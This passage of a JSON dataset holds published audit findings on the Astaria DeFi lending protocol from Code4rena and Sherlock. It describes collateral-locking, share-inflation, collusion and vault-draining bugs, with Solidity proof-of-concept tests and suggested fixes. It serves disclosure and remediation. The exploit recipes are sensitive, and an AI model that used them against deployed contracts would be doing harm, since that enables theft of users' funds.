 // create a worthless token and send it to the clearinghouse\n+    MockERC20 worthlessToken = new MockERC20(\"TestToken\",\"TST\",18);\n+    worthlessToken.mint(address(CH),550 ether);\n+\n+    // call safeTransferFrom on clearinghouse with the worthless token as paymentToken\n+    // thiss will trigger the cleaning up after succesful auction\n+    uint256 tokenAsInt = uint256(uint160(address(worthlessToken)));\n+    bytes memory emptyBytes;\n+    CH.safeTransferFrom(address(0),address(bidder),tokenAsInt,0,emptyBytes);\n\n     // assert the bidder received the NFT\n     assertEq(nft.ownerOf(tokenId), bidder, \"Bidder did not receive NFT\");\n```\n\nAfter this, the [assert the bidder received the NFT](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/test/AstariaTest.t.sol#L1037) test will fail, as the NFT is not moved.\nBut the state of the CollateralToken and LienToken contracts is updated.\n\n### Tools Used\n\nManual audit, forge\n\n### Recommended Mitigation Steps\n\nMinimal fix would be to check either check if the supplied paymentToken matches the expected paymentToken, or ignore the parameter alltogether and use the paymentToken from the contract. Other option is to restrict calls to the function to whitelisted addresses (OpenSea controler and conduit ).\n\nIn the current setup, there is no easy way for the ClearingHouse to access information about the settlementToken.<br>\nIt could be added to the AuctionData struct:\n\n```diff\ndiff --git a/src/interfaces/ILienToken.sol b/src/interfaces/ILienToken.sol\nindex 964caa2..06433c0 100644\n--- a/src/interfaces/ILienToken.sol\n+++ b/src/interfaces/ILienToken.sol\n@@ -238,6 +238,7 @@ interface ILienToken is IERC721 {\n     uint48 startTime;\n     uint48 endTime;\n     address liquidator;\n+    address settlementToken;\n     AuctionStack[] stack;\n   }\n```\n\nand then add it in LienToken\n\n```diff\ndiff --git a/src/LienToken.sol b/src/LienToken.sol\nindex 631ac02..372e197 100644\n--- a/src/LienToken.sol\n+++ b/src/LienToken.sol\n@@ -340,6 +340,8 @@ contract LienToken is ERC721, ILienToken, AuthInitializable {\n       .liquidationInitialAsk\n       .safeCastTo88();\n     auctionData.endAmount = uint88(1000 wei);\n+    auctionData.settlementToken = stack[0].lien.token; \n+\n     s.COLLATERAL_TOKEN.getClearingHouse(collateralId).setAuctionData(\n       auctionData\n     );\n```\n\nIn the ClearingHouse it can be used directly, ignoring the supplied parameter:\n\n```diff\ndiff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol\nindex 5c2a400..d305ff5 100644\n--- a/src/ClearingHouse.sol\n+++ b/src/ClearingHouse.sol\n@@ -120,7 +120,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n     IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg\n\n     ClearingHouseStorage storage s = _getStorage();\n-    address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n+    address paymentToken = s.auctionStack.settlementToken;\n\n     uint256 currentOfferPrice = _locateCurrentAmount({\n       startAmount: s.auctionStack.startAmount,\n```\n\nor used to check the supplied paramameter\n\n```diff\ndiff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol\nindex 5c2a400..5a79184 100644\n--- a/src/ClearingHouse.sol\n+++ b/src/ClearingHouse.sol\n@@ -121,6 +121,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n\n     ClearingHouseStorage storage s = _getStorage();\n     address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n+    require(paymentToken == s.auctionStack.settlementToken);\n\n     uint256 currentOfferPrice = _locateCurrentAmount({\n       startAmount: s.auctionStack.startAmount,\n```\n\nWith this step added, it would still be possible to lock the NFT in the contract, but this time that will only succeed when the requested auction amount is paid. So in that case it would be more logical to simply bid on OpenSea and also get the NFT instead of paying the tokens just to lock it.\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#564`](https://github.com/code-423n4/2023-01-astaria-findings/issues/564#event-8369713354)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the Astaria protocol which allows a malicious actor to lock a user's collateral NFT and cancel the auction. This could be misused to completely block any liquidations. \n\nWhen a borrower does not return the borrowed funds on time, a liquidator can trigger a liquidation. In this case, the collateral NFT will be listed in an Seaport dutch auction. The auction requests settlementToken and a fake ClearingHouse NFT. When a buyer bids enough of the settlementToken, openSea auction will accept the offer, transfer the NFT from ClearingHouse to bidder, move settlementToken from bidder to ClearingHouse, and 'transfers' the fake clearinghouse NFT to clearinghouse. This call to [ClearingHouse.safeTransferFrom](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L169-L178) triggers the further processing of the liquidation. It will pay the debt with the funds received from Seaport, and delete data from LienToken and CollateralToken for this collateral NFT.\n\nThe problem is that the `ClearingHouse.safeTransferFrom` can be called by anyone and assumes valid call parameters. One of the parameters `identifier` is used to pass the paymentToken address. This can easily be modified to let the contract accept any ERC20 token as `paymentToken` to payoff the debt.\n\nTo reproduce the bug, the following steps must be taken: Normal flow: borrow funds via requestLienPosition, borrowed funds are not paid back before stack.point.end, liquidator calls AstariaRouter.liquidate(...). At this time a Seaport auction is initiated and CollateralToken state for this collateralID is updated to be in auction. An evil actor can now call ClearingHouse.safeTransferFrom with dummy data and a dummy ERC20 token address as paymentToken. After this call, the Collateral NFT will still be in de ClearingHouse contract, but references to the NFT are cleaned up from both CollateralToken and LienToken. This results in the NFT being locked in the contract without any way to get it out.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/521",
      "tags": [],
      "finders": [
        "cergyk",
        "Jeiwan",
        "bin2chen",
        "Koolex",
        "ladboy233",
        "0xsomeone",
        "wallstreetvilkas",
        "0xcm",
        "HE1M",
        "c7e7eff",
        "evan",
        "Lirios",
        "synackrst",
        "unforgiven",
        "dragotanqueray"
      ]
    },
    {
      "id": "25797",
      "title": "[H-02] ERC4626Cloned deposit and mint logic differ on first deposit",
      "impact": "HIGH",
      "content": "\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127><br>\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133>\n\nThe `ERC4626Cloned` contract is an implementation of the ERC4626 used for vaults. The standard contains a `deposit` function to deposit a specific amount of the underlying asset, and a `mint` function that will calculate the amount needed of the underlying token to mint a specific number of shares.\n\nThis calculation is done in `previewDeposit` and `previewMint`:\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127>\n\n```solidity\nfunction previewDeposit(\n  uint256 assets\n) public view virtual returns (uint256) {\n  return convertToShares(assets);\n}\n\nfunction convertToShares(\n  uint256 assets\n) public view virtual returns (uint256) {\n  uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n  return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n}\n```\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133>\n\n```solidity\nfunction previewMint(uint256 shares) public view virtual returns (uint256) {\n  uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n  return supply == 0 ? 10e18 : shares.mulDivUp(totalAssets(), supply);\n}\n```\n\nIn the case of the first deposit (i.e. when `supply == 0`), `previewDeposit` will return the same `assets` amount for the shares (this is the standard implementation), while `previewMint` will simply return `10e18`.\n\n### Impact\n\nIt seems the intention was to mint a high initial number of shares on first deposit, so an attacker couldn't mint a low number of shares and manipulate the pool to frontrun an initial depositor.\n\nHowever, the protocol has failed to replicate this logic in the `deposit` function, as both `deposit` and `mint` logic differ (see PoC).\n\nAn attacker can still use the `deposit` function to mint any number of shares.\n\n### Proof of Concept\n\n```solidity\ncontract MockERC20 is ERC20(\"Mock ERC20\", \"MERC20\", 18) {\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n}\n\ncontract TestERC4626 is ERC4626Cloned {\n    ERC20 _asset;\n\n    constructor() {\n        _asset = new MockERC20();\n    }\n\n\n    function asset() public override view returns (address assetTokenAddress) {\n        return address(_asset);\n    }\n\n    function minDepositAmount() public override view returns (uint256) {\n        return 0;\n    }\n\n    function totalAssets() public override view returns (uint256) {\n        return _asset.balanceOf(address(this));\n    }\n\n    function symbol() external override view returns (string memory) {\n        return \"TEST4626\";\n    }\n    function name() external override view returns (string memory) {\n        return \"TestERC4626\";\n    }\n\n    function decimals() external override view returns (uint8) {\n        return 18;\n    }\n}\n\ncontract AuditTest is Test {\n    function test_ERC4626Cloned_DepositMintDiscrepancy() public {\n        TestERC4626 vault = new TestERC4626();\n        MockERC20 token = MockERC20(vault.asset());\n\n        // Amount we deposit\n        uint256 amount = 25e18;\n        // Shares we get if we deposit amount\n        uint256 shares = vault.previewDeposit(amount);\n        // Amount needed to mint shares\n        uint256 amountNeeded = vault.previewMint(shares);\n\n        // The following values should be equal but they not\n        assertFalse(amount == amountNeeded);\n\n        // An attacker can still mint a single share by using deposit to manipulate the pool\n        token.mint(address(this), 1);\n        token.approve(address(vault), type(uint256).max);\n        uint256 mintedShares = vault.deposit(1, address(this));\n\n        assertEq(mintedShares, 1);\n    }\n}\n```\n\n### Recommendation\n\nThe `deposit` function should also implement the same logic as the `mint` function for the case of the first depositor.\n\n**[androolloyd (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/588)**\n\n**[Picodes (judge) increased severity to High](https://github.com/code-423n4/2023-01-astaria-findings/issues/588#issuecomment-1436038087)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `ERC4626Cloned` contract, which is an implementation of the ERC4626 used for vaults. This contract contains a `deposit` function to deposit a specific amount of the underlying asset, and a `mint` function that will calculate the amount needed of the underlying token to mint a specific number of shares. The calculation is done in `previewDeposit` and `previewMint`.\n\nThe bug is that the protocol has failed to replicate the same logic in the `deposit` function as in the `mint` function for the case of the first deposit (i.e. when `supply == 0`). This means that an attacker can still use the `deposit` function to mint any number of shares, which could be manipulated to frontrun an initial depositor.\n\nThe recommendation to fix this bug is to make sure that the `deposit` function also implements the same logic as the `mint` function for the case of the first depositor. This has been confirmed and the severity of the bug has been increased to High.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/588",
      "tags": [],
      "finders": [
        "rbserver",
        "bin2chen",
        "Josiah",
        "yongskiws",
        "JTs",
        "ast3ros",
        "Breeje",
        "adriro",
        "obront",
        "JC",
        "eierina"
      ]
    },
    {
      "id": "25796",
      "title": "[H-01] `LienToken`: Lender and liquidator can collude to block auction and seize collateral",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643>\n\nIf a lender offers a loan denominated in an ERC20 token that blocks transfers to certain addresses (for example, the USDT and USDC blocklist), they may collude with a liquidator (or act as the liquidator themselves) to prevent loan payments, block all bids in the liquidation auction, and seize the borrower's collateral by transferring a `LienToken` to a blocked address.\n\n`LienTokens` act as bearer assets: if a lender transfers their lien token to another address, the lien's new payee will be the `ownerOf` the token:\n\n[`LienToken#_getPayee`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909)\n\n```solidity\n  function _getPayee(LienStorage storage s, uint256 lienId)\n    internal\n    view\n    returns (address)\n  {\n    return\n      s.lienMeta[lienId].payee != address(0)\n        ? s.lienMeta[lienId].payee\n        : ownerOf(lienId);\n  }\n```\n\nThe payee address returned by `_getPayee` is used as the recipient address of loan repayments via `makePayment`:\n\n[`LienToken#_payment`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849)\n\n```solidity\n    s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token, payer, payee, amount);\n```\n\n...as well as post-liquidation payments from the clearinghouse via `payDebtViaClearingHouse`:\n\n[`LienToken#_paymentAH`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643)\n\n```solidity\n    if (payment > 0)\n      s.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment);\n```\n\nIf an adversary tranfers their `LienToken` to an address that causes these attempted transfers to revert, like an address on the USDC blocklist, the borrower will be unable to make payments on their lien, the loan will eventually qualify for liquidation, and all bids in the Seaport auction will revert when they attempt to send payment to the blocklisted address.\n\nFollowing the failed auction, the liquidator can call `CollateralToken#liquidatorNFTClaim`, which calls `ClearingHouse#settleLiquidatorNFTClaim` and settles the loan for zero payment, claiming the \"liquidated\" collateral token for free:\n\n[`ClearingHouse#settleLiquidatorNFTClaim`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231)\n\n```solidity\n  function settleLiquidatorNFTClaim() external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    ClearingHouseStorage storage s = _getStorage();\n    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(\n      address(0),\n      COLLATERAL_ID(),\n      0,\n      s.auctionStack.stack\n    );\n  }\n```\n\nThe lender will lose the amount of their lien, but can seize the borrower's collateral, worth more than their individual lien. Malicious lenders may offer small loans with attractive terms to lure unsuspecting borrowers. Note also that the lender and liquidator can be one and the same—they don't need to be different parties to pull off this attack! A clever borrower could potentially perform this attack as well, by acting as borrower, lender, and liquidator, and buying out one of their own liens by using loaned funds.\n\n(The failed auction liquidation logic above strikes me as a little odd as well: consider whether the liquidator should instead be required to pay a minimum amount covering the bad debt in order to claim the collateral token, rather than claiming it for free).\n\n### Impact\n\n*   Malicious lender/liquidator loses amount of their lien, but keeps collateral NFT.\n*   Additional liens in the stack cannot be repaid. These other lenders take on bad debt and lose the amount of their liens.\n*   Borrower loses their collateral NFT, keeps full amount of their liens.\n\n### Recommendation\n\nThis may be difficult to mitigate. Transferring a lien to a blocklisted address is one mechanism for this attack using USDT and USDC, but there are other ways arbitrary ERC20s might revert. Two potential options:\n\n*   Maintain an allowlist of supported ERC20s and limit it to well behaved tokens—WETH, DAI, etc.\n*   Do not \"push\" payments to payees on loan payment or auction settlement, but handle this in two steps—first receiving payment from the borrower or Seaport auction and storing it in escrow, then allowing lien owners to \"pull\" the escrowed payment.\n\n### Test Case\n\nSee warden's [original submission](https://github.com/code-423n4/2023-01-astaria-findings/issues/607) for full details.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/607)**\n\n**[Picodes (judge) increased the severity to High](https://github.com/code-423n4/2023-01-astaria-findings/issues/607#issuecomment-1436024753)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the code of the Astaria platform. This bug allows malicious lenders to collude with a liquidator and prevent loan payments, block all bids in the liquidation auction, and seize the borrower's collateral. \n\nThe bug is located in the code of the LienToken.sol file in the lines 849 and 642-643. The code is responsible for returning the payee address for loan repayments and post-liquidation payments from the clearinghouse. The bug arises when an adversary transfers their LienToken to an address that causes attempted transfers to revert, like an address on the USDC blocklist. This prevents the borrower from making payments on their lien, which eventually qualifies for liquidation. All bids in the Seaport auction then revert when they attempt to send payment to the blocklisted address. \n\nThe liquidator is then able to call `CollateralToken#liquidatorNFTClaim`, which calls `ClearingHouse#settleLiquidatorNFTClaim` and settles the loan for zero payment, claiming the \"liquidated\" collateral token for free. The malicious lender then loses the amount of their lien, but keeps the collateral NFT. Other lenders in the stack also take on bad debt and lose the amount of their liens. The borrower loses their collateral NFT, but keeps the full amount of their liens.\n\nIt may be difficult to mitigate this bug. Two potential options are to maintain an allowlist of supported ERC20s and limit it to well behaved tokens, or do not \"push\" payments to payees on loan payment or auction settlement. See warden's original submission for full details. The bug has been confirmed by SantiagoGregory (Astaria) and the severity has been increased to High by Picodes (judge).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/607",
      "tags": [],
      "finders": [
        "KIntern\\_NA",
        "peakbolt",
        "horsefacts"
      ]
    },
    {
      "id": "3701",
      "title": "M-26: ERC4626 does not work with fee-on-transfer tokens",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/3 \n\n## Found by \npashov, w42d3n, Bnke0x0\n\n## Summary\n\n## Vulnerability Detail\n\n## Impact\nThe ERC4626-Cloned.deposit/mint functions do not work well with fee-on-transfer tokens as the `assets` variable is the pre-fee amount, including the fee, whereas the totalAssets do not include the fee anymore.\n\n## Code Snippet\nThis can be abused to mint more shares than desired.\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/ERC4626-Cloned.sol#L305-L322\n\n             '  function deposit(uint256 assets, address receiver)\n                 public\n                 virtual\n                 override(IVault)\n                 returns (uint256 shares)\n               {\n                 // Check for rounding error since we round down in previewDeposit.\n                 require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n                 // Need to transfer before minting or ERC777s could reenter.\n                 ERC20(underlying()).safeTransferFrom(msg.sender, address(this), assets);\n\n                 _mint(receiver, shares);\n\n                 emit Deposit(msg.sender, receiver, assets, shares);\n\n                 afterDeposit(assets, shares);\n               }'\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/ERC4626-Cloned.sol#L315\n\n     `ERC20(underlying()).safeTransferFrom(msg.sender, address(this), assets);`\n\nA `deposit(1000)` should result in the same shares as two deposits of `deposit(500)` but it does not because `assets` is the pre-fee amount.\nAssume a fee-on-transfer of `20%`. Assume current `totalAmount = 1000`, `totalShares = 1000` for simplicity.\n\n`deposit(1000) = 1000 / totalAmount * totalShares = 1000 shares`.\n`deposit(500) = 500 / totalAmount * totalShares = 500 shares`. Now the `totalShares` increased by 500 but the `totalAssets` only increased by `(100% - 20%) * 500 = 400`. Therefore, the second `deposit(500) = 500 / (totalAmount + 400) * (newTotalShares) = 500 / (1400) * 1500 = 535.714285714 shares`.\n\nIn total, the two deposits lead to `35` more shares than a single deposit of the sum of the deposits.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n`assets` should be the amount excluding the fee, i.e., the amount the contract actually received.\nThis can be done by subtracting the pre-contract balance from the post-contract balance.\nHowever, this would create another issue with ERC777 tokens.\n\nMaybe `previewDeposit` should be overwritten by vaults supporting fee-on-transfer tokens to predict the post-fee amount. And do the shares computation on that, but then the `afterDeposit` is still called with the original `assets`and implementers need to be aware of this.\n\n## Discussion\n\n**androolloyd**\n\nwe will not be supporting fee on transfer tokens at the time",
      "summary": "\nThis bug report is about an issue with the ERC4626 code, which does not work with fee-on-transfer tokens. The issue is that the `assets` variable is the pre-fee amount, including the fee, whereas the totalAssets do not include the fee anymore. This can be abused to mint more shares than desired. The code snippet provided shows the deposit function which is affected by this issue. It is recommended that the `assets` should be the amount excluding the fee, i.e., the amount the contract actually received. However, this could create another issue with ERC777 tokens. An alternative solution could be to overwrite the `previewDeposit` function to predict the post-fee amount and do the shares computation on that. The discussion section of the bug report states that the team will not be supporting fee-on-transfer tokens at the time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/3",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "Bnke0x0",
        "w42d3n",
        "pashov"
      ]
    },
    {
      "id": "3700",
      "title": "M-25: Bids cannot be created within timeBuffer of completion of a max duration auction",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/18 \n\n## Found by \nobront, yixxas, minhquanym, neila, 0xRajeev, TurnipBoy, hansfriese, Prefix, 0x4141, rvierdiiev, peanuts, csanuragjain, Jeiwan\n\n## Summary\n\nThe auction mechanism is intended to watch for bids within `timeBuffer` of the end of the auction, and automatically increase the remaining duration to `timeBuffer` if such a bid comes in.\n\nThere is an error in the implementation that causes all bids within `timeBuffer` of the end of a max duration auction to revert, effectively ending the auction early and cutting off bidders who intended to wait until the end.\n\n## Vulnerability Detail\n\nIn the `createBid()` function in AuctionHouse.sol, the function checks if a bid is within the final `timeBuffer` of the auction:\n\n```solidity\nif (firstBidTime + duration - block.timestamp < timeBuffer)\n```\n\nIf so, it sets `newDuration` to equal the amount that will extend the auction to `timeBuffer` from now:\n\n```solidity\nuint64 newDuration = uint256( duration + (block.timestamp + timeBuffer - firstBidTime) ).safeCastTo64();\n```\n\nIf this `newDuration` doesn't extend beyond the `maxDuration`, this works great. However, if it does extend beyond `maxDuration`, the following code is used to update `duration`:\n\n```solidity\nauctions[tokenId].duration = auctions[tokenId].maxDuration - firstBidTime;\n```\n\nThis code is incorrect. `maxDuration` will be a duration for the contest (currently set to 3 days), whereas `firstTimeBid` is a timestamp for the start of the auction (current timestamps are > 1 billion). \n\nSubtracting `firstTimeBid` from `maxDuration` will underflow, which will revert the function.\n\n## Impact\n\n- Bidders who expected to wait until the end of the auction to vote will be cut off from voting, as the auction will revert their bids.\n- Vaults whose collateral is up for auction will earn less than they otherwise would have.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L127-L146\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange this assignment to simply assign `duration` to `maxDuration`, as follows:\n\n```solidity\nauctions[tokenId].duration = auctions[tokenId].maxDuration\n```",
      "summary": "\nThis bug report is about a vulnerability in the `createBid()` function in AuctionHouse.sol, which is part of the Astaria GPL. The vulnerability causes bids within `timeBuffer` of the end of a max duration auction to revert, effectively ending the auction early and cutting off bidders who intended to wait until the end. \n\nThe issue is caused by incorrect code in the `createBid()` function. The function checks if a bid is within the final `timeBuffer` of the auction, and if so, sets `newDuration` to equal the amount that will extend the auction to `timeBuffer` from now. If this `newDuration` doesn't extend beyond the `maxDuration`, this works great. However, if it does extend beyond `maxDuration`, the incorrect code is used to update `duration`, which will underflow and revert the function.\n\nThe impact of this vulnerability is that bidders who expected to wait until the end of the auction to vote will be cut off from voting, as the auction will revert their bids. Vaults whose collateral is up for auction will also earn less than they otherwise would have.\n\nThe code snippet for this vulnerability can be found at: https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L127-L146. The bug was found by obront, yixxas, minhquanym, neila, 0xRajeev, TurnipBoy, hansfriese, Prefix, 0x4141, rvierdiiev, peanuts, csanuragjain, and Jeiwan.\n\nThe recommendation for this vulnerability is to change the assignment to simply assign `duration` to `maxDuration`:\n\n```solidity\nauctions[tokenId].duration = auctions[tokenId].maxDuration\n```",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/18",
      "tags": [],
      "finders": [
        "csanuragjain",
        "yixxas",
        "0x4141",
        "Jeiwan",
        "minhquanym",
        "0xRajeev",
        "neila",
        "TurnipBoy",
        "hansfriese",
        "peanuts",
        "Prefix",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "3699",
      "title": "M-24: Vault Fee uses incorrect offset leading to wildly incorrect value, allowing strategists to steal all funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/19 \n\n## Found by \nobront, zzykxx\n\n## Summary\n\n`VAULT_FEE()` uses an incorrect offset, returning a number ~1e16X greater than intended, providing strategists with unlimited access to drain all vault funds.\n\n## Vulnerability Detail\n\nWhen using ClonesWithImmutableArgs, offset values are set so that functions representing variables can retrieve the correct values from storage. \n\nIn the ERC4626-Cloned.sol implementation, `VAULT_TYPE()` is given an offset of 172. However, the value before it is a `uint8` at the offset 164. Since a `uint8` takes only 1 byte of space, `VAULT_TYPE()` should have an offset of 165.\n\nI put together a POC to grab the value of `VAULT_FEE()` in the test setup:\n\n```solidity\nfunction testVaultFeeIncorrectlySet() public {\n  Dummy721 nft = new Dummy721();\n  address tokenContract = address(nft);\n  uint256 tokenId = uint256(1);\n  address publicVault = _createPublicVault({\n      strategist: strategistOne,\n      delegate: strategistTwo,\n      epochLength: 14 days\n  });\n  uint fee = PublicVault(publicVault).VAULT_FEE();\n  console.log(fee)\n  assert(fee == 5000); // 5000 is the value that was meant to be set\n}\n```\n\nIn this case, the value returned is > 3e20. \n\n## Impact\n\nThis is a highly critical bug. `VAULT_FEE()` is used in `_handleStrategistInterestReward()` to determine the amount of tokens that should be allocated to `strategistUnclaimedShares`.\n\n```solidity\nif (VAULT_FEE() != uint256(0)) {\n    uint256 interestOwing = LIEN_TOKEN().getInterest(lienId);\n    uint256 x = (amount > interestOwing) ? interestOwing : amount;\n    uint256 fee = x.mulDivDown(VAULT_FEE(), 1000); //VAULT_FEE is a basis point\n    strategistUnclaimedShares += convertToShares(fee);\n  }\n```\nThe result is that strategistUnclaimedShares will be billions of times higher than the total interest generated, essentially giving strategist access to withdraw all funds from their vaults at any time.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/ERC4626-Cloned.sol#L113-L116\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L518-L523\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSet the offset for `VAULT_FEE()` to 165. I tested this value in the POC I created and it correctly returned the value of 5000.",
      "summary": "\nThis bug report is about an issue M-24 found by obront and zzykxx in the ERC4626-Cloned.sol implementation of the Astaria protocol. The issue is related to the `VAULT_FEE()` function, which uses an incorrect offset, returning a number ~1e16X greater than intended. This allows strategists to have unlimited access to drain all funds from their vaults.\n\nThe root cause of the issue is that the offset for `VAULT_FEE()` is set to 172, while the value before it is a `uint8` at the offset 164. Since a `uint8` takes only 1 byte of space, `VAULT_FEE()` should have an offset of 165.\n\nThe impact of the bug is that the value of `strategistUnclaimedShares` will be billions of times higher than the total interest generated, essentially giving strategists access to withdraw all funds from their vaults at any time.\n\nThe code snippets related to the issue can be found in the GitHub repository. The bug was found using manual review. The recommended solution is to set the offset for `VAULT_FEE()` to 165.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/19",
      "tags": [],
      "finders": [
        "obront",
        "zzykxx"
      ]
    },
    {
      "id": "3698",
      "title": "M-23: _getInterest() function uses block.timestamp instead of the inputted timestamp",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/25 \n\n## Found by \nobront, sorrynotsorry\n\n## Summary\n\nThe `_getInterest()` function takes a timestamp as input. However, in a crucial check in the function, it uses `block.timestamp` instead. The result is that other functions expecting accurate interest amounts will receive incorrect values.\n\n## Vulnerability Detail\n\nThe `_getInterest()` function takes a lien and a timestamp as input. The intention is for it to calculate the amount of time that has passed in the lien (`delta_t`) and multiply this value by the rate and the amount to get the interest generated by this timestamp.\n\nHowever, the function uses the following check regarding the timestamp:\n\n```solidity\nif (block.timestamp >= lien.start + lien.duration) {\n  delta_t = uint256(lien.start + lien.duration - lien.last);\n} \n```\n\nBecause this check uses `block.timestamp` before returning the maximum interest payment, the function will incorrectly determine which path to take, and return an incorrect interest value.\n\n## Impact\n\nThere are two negative consequences that can come from this miscalculation:\n\n- if the function is called when the lien is over (`block.timestamp >= lien.start + lien.duration`) to check an interest amount from a timestamp during the lien, it will incorrectly return the maximum interest value\n- If the function is called when the lien is active for a timestamp long after the lien is over, it will skip the check to return maximum value and return the value that would have been generated if interest kept accruing indefinitely (using `delta_t = uint256(timestamp.safeCastTo32() - lien.last);`)\n\nThis `_getInterest()` function is used in many crucial protocol functions (`_getOwed()`, `calculateSlope()`, `changeInSlope()`, `getTotalDebtForCollateralToken()`), so these incorrect values can have surprising and unexpected negative impacts on the protocol.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L177-L196\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange `block.timestamp` to `timestamp` so that the if statement checks correctly.",
